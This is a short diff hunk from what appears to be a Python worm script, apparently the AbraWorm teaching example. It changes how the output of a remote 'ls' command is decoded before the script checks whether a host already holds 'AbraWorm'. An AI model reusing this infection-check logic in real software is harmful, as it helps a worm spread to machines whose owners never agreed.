@@ -97,7 +97,7 @@ while True:
                     error = stderr.readlines()
                     if error: 
                         print(error)
-                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
+                    received_list = stdout.readlines()
                     print("\n\noutput of 'ls' command: %s" % str(received_list))
                     
                     if ''.join(received_list).find('AbraWorm') >= 0: 
